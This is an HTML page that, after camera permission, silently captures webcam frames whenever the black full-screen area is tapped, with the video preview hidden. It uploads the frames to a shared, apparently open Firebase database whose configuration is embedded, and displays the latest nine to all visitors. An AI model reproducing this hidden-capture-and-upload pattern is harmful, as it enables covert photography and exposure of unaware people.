<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Live Photo Sync - 9 Photos Grid</title>
  <style>
    body {
      background: black;
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      color: white;
      overflow-y: scroll;
      min-height: 100vh;
    }

    #captureArea {
      height: 100vh;
      width: 100vw;
    }

    #result {
      padding: 20px;
      text-align: center;
    }

    #photoGrid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      justify-items: center;
    }

    .livePhoto {
      width: 90%;
      max-width: 120px;
      border: 2px solid white;
    }
  </style>
</head>
<body>

  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>

  <div id="result">
    <h3>Live Photo Grid:</h3>
    <div id="photoGrid"></div>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
      authDomain: "livesnap-d57c2.firebaseapp.com",
      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "livesnap-d57c2",
      storageBucket: "livesnap-d57c2.firebasestorage.app",
      messagingSenderId: "24202813286",
      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
      measurementId: "G-BR9MFH2XN6"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoGrid = document.getElementById('photoGrid');

    // Start camera
    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
      video.srcObject = stream;
    });

    // Capture photo and push to array
    function capture() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL("image/jpeg");

      db.ref("livephotos").once("value", snapshot => {
        const currentPhotos = snapshot.val() || [];
        if (currentPhotos.length >= 9) currentPhotos.shift(); // remove oldest
        currentPhotos.push(dataUrl);
        db.ref("livephotos").set(currentPhotos);
      });

      document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
    }

    // Display 9 live photos
    db.ref("livephotos").on("value", snapshot => {
      const photos = snapshot.val() || [];
      photoGrid.innerHTML = "";
      photos.forEach(url => {
        const img = document.createElement("img");
        img.src = url;
        img.className = "livePhoto";
        photoGrid.appendChild(img);
      });
    });
  </script>
</body>
</html>
